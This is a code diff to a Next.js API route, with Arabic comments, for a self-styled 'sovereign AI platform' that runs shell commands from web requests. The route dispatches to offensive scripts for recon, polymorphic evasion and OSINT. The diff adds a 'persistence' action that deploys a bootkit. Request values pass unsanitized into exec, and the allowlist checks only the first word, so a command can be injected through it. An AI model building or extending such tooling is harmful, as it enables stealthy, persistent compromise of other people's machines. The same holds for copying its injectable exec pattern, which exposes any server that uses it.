@@ -9,47 +9,52 @@ export async function POST(req: NextRequest) {
   try {
     const { command, target, args, type } = await req.json();
 
-    // مسارات السكريبتات
+    // مسارات السكريبتات في النظام السيادي
     const BASE_PATH = '/opt/sovereign-ai-platform';
     const SCRIPTS = {
       apex: path.join(BASE_PATH, 'ai-engine/offensive/apex_brain.py'),
       osint: path.join(BASE_PATH, 'osint/osint_master.py'),
       gepa: path.join(BASE_PATH, 'gepa/gepa_v35.py'),
-      polymorph: path.join(BASE_PATH, 'evasion/polymorph_engine.py')
+      polymorph: path.join(BASE_PATH, 'evasion/polymorph_engine.py'),
+      deploy_bootkit: path.join(BASE_PATH, 'bootkits/deploy_bootkit.sh'),
     };
 
-    let fullCommand = '';
+    let executableCommand = '';
 
-    // بناء الأمر بناءً على النوع المطلوب
+    // توجيه الأوامر بناءً على النوع
     switch (type) {
       case 'terminal':
-        // فحص الأوامر المسموح بها في المحطة
-        const allowedCommands = ['nmap', 'ping', 'whois', 'dig', 'traceroute', 'curl'];
+        // حماية: السماح بأوامر محددة فقط أو تنفيذ مباشر تحت إشراف القائد
+        const allowedCommands = ['nmap', 'ping', 'whois', 'dig', 'traceroute', 'curl', 'ls', 'pwd'];
         const cmdBase = command.split(' ')[0];
         if (!allowedCommands.includes(cmdBase)) {
           return NextResponse.json({ error: 'Command not authorized by Sovereign Core.' }, { status: 403 });
         }
-        fullCommand = command;
+        executableCommand = command;
         break;
       
       case 'apex':
-        fullCommand = `python3 ${SCRIPTS.apex} ${target}`;
+        executableCommand = `python3 ${SCRIPTS.apex} ${target}`;
         break;
       
       case 'osint':
-        fullCommand = `python3 ${SCRIPTS.osint} ${args} ${target}`;
+        executableCommand = `python3 ${SCRIPTS.osint} ${args} ${target}`;
         break;
 
       case 'polymorph':
-        fullCommand = `python3 ${SCRIPTS.polymorph} ${target}`;
+        executableCommand = `python3 ${SCRIPTS.polymorph} ${target}`;
+        break;
+      
+      case 'persistence':
+        executableCommand = `bash ${SCRIPTS.deploy_bootkit}`;
         break;
 
       default:
         return NextResponse.json({ error: 'Invalid execution type.' }, { status: 400 });
     }
 
-    // تنفيذ الأمر
-    const { stdout, stderr } = await execPromise(fullCommand);
+    // تنفيذ الأمر الفعلي
+    const { stdout, stderr } = await execPromise(executableCommand);
 
     return NextResponse.json({
       output: stdout || stderr,
